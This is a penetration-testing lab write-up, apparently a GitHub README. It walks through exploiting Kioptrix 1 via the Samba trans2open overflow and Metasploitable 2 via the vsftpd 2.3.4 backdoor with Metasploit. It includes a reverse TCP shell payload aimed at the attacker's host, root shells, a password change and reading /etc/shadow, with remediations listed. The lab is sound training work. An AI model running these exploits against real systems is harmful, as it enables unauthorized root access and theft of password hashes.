Penetration Testing Lab for Kioptrix 1 and Metasploitable 2

A full penetration testing exercise against two classic intentionally-vulnerable VMs — Kioptrix: Level 1 and Metasploitable 2 — covering the complete attack chain: reconnaissance, enumeration, exploitation, gaining root access, and post-exploitation.

![Scope](https://img.shields.io/badge/scope-exploitation-red)
![Targets](https://img.shields.io/badge/targets-Kioptrix%201%20%7C%20Metasploitable%202-orange)
![License](https://img.shields.io/badge/license-MIT-green)

## Scope

This repo documents **full exploitation**, including gaining root/administrative access and performing post-exploitation activities, against intentionally vulnerable training VMs in an isolated lab network. It builds directly on the [Cybersecurity Vulnerability Scanning Lab](https://github.com/IsaacAkins/Cybersecurity-Vulnerability-Scanning-Lab-for-Kioptrix-1-and-Metasploitable-2) repo, which covers reconnaissance and vulnerability *identification* only — this repo picks up where that one intentionally stopped, using those same scan findings to actually gain access.

## Objectives

- Identify the methods and steps a remote attacker could use to obtain access to each victim machine
- Identify the level of risk each vulnerability represents
- Identify possible countermeasures, remediations, and recommendations to prevent or mitigate each attack

## Methodology

1. **Network Scanning** — locate the target on the network
2. **Enumeration** — identify exact service versions to research known vulnerabilities against
3. **Exploitation** — use a matched exploit to gain initial access
4. **Gaining Root Access** — escalate or confirm full privileged access
5. **Post-Exploitation** — demonstrate impact (e.g. account takeover, lateral movement, data access)

## Tools Used

- **Netdiscover**, `ifconfig`/`ip a`, `ping` — host discovery and network configuration
- **Nmap** — port/service scanning
- **Nikto**, **Nessus** — vulnerability scanning (see the companion [Vulnerability Scanning Lab](https://github.com/IsaacAkins/Cybersecurity-Vulnerability-Scanning-Lab-for-Kioptrix-1-and-Metasploitable-2) repo for full results)
- **Searchsploit** — offline Exploit-DB search
- **Metasploit Framework** — exploitation and post-exploitation
- **smbclient** — SMB share enumeration

---

## Part 1 — Kioptrix: Level 1 (SMB / Samba Exploitation)

**Target vulnerability:** Samba 2.2.1a `trans2open` remote buffer overflow (CVE-2003-0201)

### 1. Reconnaissance

Confirm the attacking machine can reach the target:

```bash
ping -c 3 <KIOPTRIX_IP>
```

If the target's IP isn't already known, discover it on the local network range:

```bash
sudo netdiscover -r <your_subnet>/24
# e.g. sudo netdiscover -r 172.20.10.0/24
```

<img width="1536" height="713" alt="Screenshot_2026-09-02_08_20_53" src="https://github.com/user-attachments/assets/7ceddf0f-18aa-452c-9be3-4660f11594fe" />

An initial quick scan confirms the host is up and reachable:

```bash
nmap <KIOPTRIX_IP>
```

### 2. Enumeration

> Full port/service, NSE vulnerability script, Nikto, and Nessus results for Kioptrix 1 are documented in detail in the [Vulnerability Scanning Lab](https://github.com/IsaacAkins/Cybersecurity-Vulnerability-Scanning-Lab-for-Kioptrix-1-and-Metasploitable-2) repo. The summary relevant to this exploit path:

```
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
```

**Confirm the exact Samba version with `smbclient`:**

```bash
smbclient -L <KIOPTRIX_IP>
```

<img width="1536" height="713" alt="Screenshot_2026-09-02_08_22_39" src="https://github.com/user-attachments/assets/472b7d7c-6738-401d-841a-77ea10f80496" />

```
Server does not support EXTENDED_SECURITY but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.
Server does not support EXTENDED_SECURITY but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
        Server               Comment
        ---------            -------
        KIOPTRIX             Samba Server

        Workgroup            Master
        ---------            -------
        MYGROUP              KIOPTRIX

```

This does not confirm the exact vulnerable version: **Samba 2.2.1a**.

**Use another method with Metasploit's own SMB version scanner:**

```bash
msfconsole
msf6 > search smb_scanner_version
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS <KIOPTRIX_IP>
msf6 auxiliary(scanner/smb/smb_version) > run
```

```
[*] <KIOPTRIX_IP>:139    - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*]  <KIOPTRIX_IP>:139   -   Host could not be identified: Unix (Samba 2.2.1a)
[*] <KIOPTRIX_IP>:        - Scanned 1 of 1 hosts (100% complete)
```

<img width="1536" height="713" alt="Screenshot_2026-09-02_08_27_54" src="https://github.com/user-attachments/assets/dbe5ba38-b33a-4ec4-b847-59e5db861eb7" />

Confirms the same version (2.2.1a) independently.

### 3. Vulnerability Research

Search Exploit-DB locally via `searchsploit`:

```bash
searchsploit samba 2.2
```

<img width="1536" height="713" alt="Screenshot_2026-09-02_08_28_30" src="https://github.com/user-attachments/assets/a5a125e0-67ab-4e65-9c5d-36b5a7bad50e" />

Searching the exact version (`2.2.1a`) returns nothing — Exploit-DB entries are typically indexed by version ranges, not exact patch strings. Searching the shortened version (`2.2`) surfaces multiple matches, including several `trans2open` buffer overflow entries across different platforms (Linux x86, *BSD x86, Mac OS X PPC, Solaris SPARC).

A quick web search for "Samba 2.2.1a exploits" confirms `trans2open` as the well-documented, recurring exploit for this exact version, along with Metasploit as the standard tool used to weaponize it.

<img width="1536" height="713" alt="Screenshot_2026-09-02_08_29_36" src="https://github.com/user-attachments/assets/597fa342-8540-485b-b0c3-9dd1673ae584" />

### 4. Exploitation

Launch Metasploit and search for the exploit:

```bash
msfconsole
msf6 > search trans2open
```

<img width="1536" height="713" alt="Screenshot_2026-09-02_08_54_59" src="https://github.com/user-attachments/assets/c1657d1f-7935-4c81-bfb1-0723a8cb96d8" />

```
Matching Modules
================
   Name                                Disclosure Date  Rank   Description
   ----                                ---------------  ----   -----------
   exploit/freebsd/samba/trans2open    2003-04-07        great  Samba trans2open Overflow (*BSD x86)
   exploit/linux/samba/trans2open      2003-04-07        great  Samba trans2open Overflow (Linux x86)
   exploit/osx/samba/trans2open        2003-04-07        great  Samba trans2open Overflow (Mac OS X PPC)
   exploit/solaris/samba/trans2open    2003-04-07        great  Samba trans2open Overflow (Solaris SPARC)
```

Select the Linux-targeted variant, since Kioptrix runs Linux:

```bash
msf6 > use exploit/linux/samba/trans2open
msf6 exploit(linux/samba/trans2open) > set RHOST <KIOPTRIX_IP>
msf6 exploit(linux/samba/trans2open) > show options
```

```
Module options (exploit/linux/samba/trans2open):
   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOST   <KIOPTRIX_IP>    yes       The target address
   RPORT   139              yes       The target port (TCP)

Exploit target:
   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce
```

**First attempt (default staged payload) fails.** The default payload for this exploit is a *staged* Meterpreter payload, which can be unreliable against this specific legacy target due to how the buffer overflow interacts with staged payload delivery. Switching to an **unstaged** shell payload resolves this:

```bash
msf6 exploit(linux/samba/trans2open) > show payloads
msf6 exploit(linux/samba/trans2open) > set payload payload/linux/x86/shell_reverse_tcp
msf6 exploit(linux/samba/trans2open) > set RHOSTS <KIOPTRIX_IP>
msf6 exploit(linux/samba/trans2open) > set LHOST <KALI_IP>
msf6 exploit(linux/samba/trans2open) > options
```

<img width="1536" height="713" alt="Screenshot_2026-09-02_08_58_00" src="https://github.com/user-attachments/assets/d2677793-877a-44a5-ac24-b8d77d973a37" />

```
Payload options (linux/x86/shell_reverse_tcp):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   CMD    /bin/sh          yes       The command string to execute
   LHOST  <KALI_IP>        yes       The listen address
   LPORT  4444             yes       The listen port
```

Run the exploit:

```bash
msf6 exploit(linux/samba/trans2open) > run
```

<img width="1536" height="713" alt="Screenshot_2026-09-02_08_58_44" src="https://github.com/user-attachments/assets/59abfe30-5239-498c-9d7f-32bdf860297e" />

```
[*] Started reverse TCP handler on <KALI_IP>:4444
[*] <KIOPTRIX_IP>:139 - Trying return address 0x...
...
[*] Command shell session 1 opened (<KALI_IP>:4444 -> <KIOPTRIX_IP>:1025)
```

### 5. Gaining Root Access

The `trans2open` overflow in Samba 2.2.1a executes with root privileges by default (Samba's `smbd` daemon typically runs as root to manage file permissions), so a successful exploit lands directly in a root shell — no separate privilege escalation step is required on this target.

Verify:

```bash
whoami
```

<img width="1536" height="713" alt="Screenshot_2026-09-02_08_58_51" src="https://github.com/user-attachments/assets/63ea14e4-2e58-4b90-968d-5ebef76f60f6" />

```
root
```

### 6. Post-Exploitation

With root access confirmed, demonstrate impact and explore the environment:

**Account takeover — change the root password:**

```bash
passwd
```

**Explore the filesystem for sensitive information:**

```bash
ls
cd /home
cat <any files of interest>
```


### Kioptrix 1 — Findings Summary

| Step | Result |
|---|---|
| Vulnerable service | Samba 2.2.1a on port 139 |
| CVE | CVE-2003-0201 (`trans2open` buffer overflow) |
| Exploit used | Metasploit `exploit/linux/samba/trans2open` |
| Payload | `linux/x86/shell_reverse_tcp` (unstaged — staged payload failed) |
| Privilege level gained | Root (direct, no separate escalation needed) |
| Post-exploitation | Password change, filesystem exploration |
| Risk level | **Critical** — unauthenticated remote root compromise |
| Remediation | Upgrade Samba to a patched version (2.2.9+ or a supported release); disable/remove Samba entirely if not required; apply network segmentation so legacy services aren't internet-facing |

---

## Part 2 — Metasploitable 2 (vsftpd 2.3.4 Backdoor Exploitation)

**Target vulnerability:** vsftpd 2.3.4 backdoor (CVE-2011-2523) — a maliciously trojaned build of vsftpd distributed briefly in July 2011, containing a hidden backdoor triggered by a specific string in the FTP `USER` field.

### 1. Reconnaissance

```bash
ping -c 3 <METASPLOITABLE_IP>
```

If the IP isn't already known:

```bash
sudo netdiscover -r <your_subnet>/24
```

<img width="1536" height="713" alt="Screenshot_2026-09-02_09_02_09" src="https://github.com/user-attachments/assets/43e0c799-896e-4455-a1c1-886710f6ba28" />

### 2. Enumeration

> Full port/service and NSE vulnerability script results for Metasploitable 2 are documented in the [Vulnerability Scanning Lab](https://github.com/IsaacAkins/Cybersecurity-Vulnerability-Scanning-Lab-for-Kioptrix-1-and-Metasploitable-2) repo. The relevant finding for this exploit path:

```
21/tcp   open  ftp   vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

Nmap's `--script=vuln` scan in that same repo already **confirmed** this backdoor is live and exploitable:

```
| ftp-vsftpd-backdoor:
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  BID:48539  CVE:CVE-2011-2523
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
```

This means the vulnerable version, and its exploitability, are already established before Metasploit is even opened — enumeration here is confirming what was already proven at the scanning stage, not starting from scratch.

### 3. Vulnerability Research

Search Exploit-DB locally:

```bash
searchsploit vsftpd 2.3.4
```

<img width="1536" height="713" alt="Screenshot_2026-09-02_09_02_57" src="https://github.com/user-attachments/assets/50394ab5-3cdc-499a-ab8b-58d25edc2170" />

```
Exploit Title                                          | Path
--------------------------------------------------------------------------------
vsftpd 2.3.4 - Backdoor Command Execution               | unix/remote/49757.py
VSFTPD v2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rb
```

This confirms a matching Metasploit module exists, so exploitation is done through `msfconsole` rather than the standalone script.

### 4. Exploitation

```bash
msfconsole
msf6 > search vsftpd
```

<img width="1536" height="713" alt="Screenshot_2026-09-02_09_05_00" src="https://github.com/user-attachments/assets/4b76f066-737d-40fb-94d6-9d08b46650b5" />

```
Matching Modules
================
   Name                                  Disclosure Date  Rank       Description
   ----                                  ---------------  ----       -----------
   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03        excellent VSFTPD v2.3.4 Backdoor Command Execution
```

Select and configure the module:

```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS <METASPLOITABLE_IP>
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
```

<img width="1536" height="713" alt="Screenshot_2026-09-02_09_06_55" src="https://github.com/user-attachments/assets/ec3367f8-6e7e-4f2e-9332-1dd474a89a2c" />

```
Module options (exploit/unix/ftp/vsftpd_234_backdoor):
   Name    Current Setting     Required  Description
   ----    ---------------     --------  -----------
   RHOSTS  <METASPLOITABLE_IP> yes       The target host(s)
   RPORT   21                  yes       The target port (TCP)
```

Unlike the Kioptrix exploit, this module doesn't rely on a separate configurable payload in the usual sense — the "backdoor" itself is the payload delivery mechanism (sending a crafted `USER` string containing `:)` opens a listener on port 6200 on the target). Run it directly:

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
```

```
[*] <METASPLOITABLE_IP>:21 - Banner: 220 (vsFTPd 2.3.4)
[*] <METASPLOITABLE_IP>:21 - USER: 331 Please specify the password.
[+] <METASPLOITABLE_IP>:21 - Backdoor service has been spawned, handling...
[+] <METASPLOITABLE_IP>:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (<KALI_IP> -> <METASPLOITABLE_IP>:6200)
```

### 5. Gaining Root Access

The backdoor shell spawned by the trojaned vsftpd build runs with root privileges by default — there is no privilege escalation step required; access is root from the first command.

Verify:

```bash
id
```

<img width="1536" height="713" alt="Screenshot_2026-09-02_09_07_33" src="https://github.com/user-attachments/assets/43bc61dd-2fb5-4071-bd4e-044c9070d0ce" />

```
uid=0(root) gid=0(root)
```

### 6. Post-Exploitation

With root access confirmed, explore the environment to demonstrate impact:

```bash
whoami
hostname
cat /etc/shadow
ls /root
```

<img width="1536" height="713" alt="Screenshot_2026-09-02_09_07_40" src="https://github.com/user-attachments/assets/1a6ecd3f-4d23-4d7a-b376-214cf9ac9f6e" />

*(Reading `/etc/shadow` demonstrates the severity clearly — full access to every user's password hash on the system from a completely unauthenticated FTP interaction.)*

### Metasploitable 2 — Findings Summary

| Step | Result |
|---|---|
| Vulnerable service | vsftpd 2.3.4 on port 21 |
| CVE | CVE-2011-2523 (malicious trojaned source distribution) |
| Exploit used | Metasploit `exploit/unix/ftp/vsftpd_234_backdoor` |
| Payload | Built into the backdoor itself — no separate payload selection needed |
| Privilege level gained | Root (direct, no escalation needed) |
| Post-exploitation | Full filesystem/credential access demonstrated (`/etc/shadow`) |
| Risk level | **Critical** — unauthenticated remote root compromise, no interaction required beyond a connection attempt |
| Remediation | Immediately remove/replace this specific vsftpd build with an official, unmodified release; verify package checksums/signatures on any future installs; this exact incident (2011 backdoored tarball) is the reason checksum verification of downloaded software is considered standard practice today |

---

## Troubleshooting Common Errors

### "Exploit completed, but no session was created."

- **Cause:** The victim machine can't connect back to Kali (relevant for reverse-shell payloads like the one used against Kioptrix).
- **Fix:** Double-check `LHOST` is set to Kali's actual IP address on the shared lab network (`ip a` to confirm).
- **Fix:** Confirm both the attacker and victim VMs are on the same VirtualBox network (e.g. the same NAT Network) and can ping each other.

### Kioptrix freezes or doesn't get an IP address

- **Fix:** Confirm the VirtualBox network adapter type is set to `PCnet-PCI II (Am79C970A)` — see the [Vulnerability Assessment Lab Setup](https://github.com/IsaacAkins/Cybersecurity-Vulnerability-Assessment-Lab-Setup) repo for this step.
- **Fix:** Removing the USB controller in VirtualBox's settings for the Kioptrix VM often resolves boot freezes on this legacy image.

### "Connection Refused"

- **Cause:** The targeted service isn't actually running, or the wrong IP is being targeted.
- **Fix:** Re-run `netdiscover` to confirm the target's current IP — DHCP-assigned addresses can change between VM reboots.

---

## Lessons Learned

- Cross-validating a service version with two independent tools (`smbclient` and Metasploit's `smb_version` scanner) before committing to an exploit builds confidence and avoids wasted attempts against a misidentified version.
- Default exploit settings don't always work — the `trans2open` module's default staged payload failed against this target, and switching to an unstaged payload was what actually made the exploit succeed. Troubleshooting exploit failures is as much a real skill as finding the vulnerability in the first place.
- A successful low-level service exploit (Samba running as root, or a trojaned vsftpd build) can skip privilege escalation entirely — not every engagement requires a separate escalation phase if the initial foothold already lands at the highest privilege level
- The vsftpd backdoor is a good real-world reminder of supply-chain risk: this wasn't a coding flaw in vsftpd itself, but a malicious tampering of the distributed source tarball — the same class of risk seen in modern software supply-chain attacks, just twenty years earlier
- Findings from a pure vulnerability *scan* (the companion Scanning Lab repo) directly fed into exploitation here — Nmap's `ftp-vsftpd-backdoor` NSE script had already proven exploitability before Metasploit was even opened, showing how the scanning and exploitation phases connect in a real engagement

## Disclaimer

This repo documents full exploitation, including gaining root access, performed exclusively against intentionally vulnerable training VMs (Kioptrix and Metasploitable 2) in an isolated, authorized lab network that the author owns and controls. No techniques documented here were used, or should be used, against any system without explicit written authorization. Unauthorized access to computer systems is illegal.

## License

MIT — see [LICENSE](LICENSE) for details.
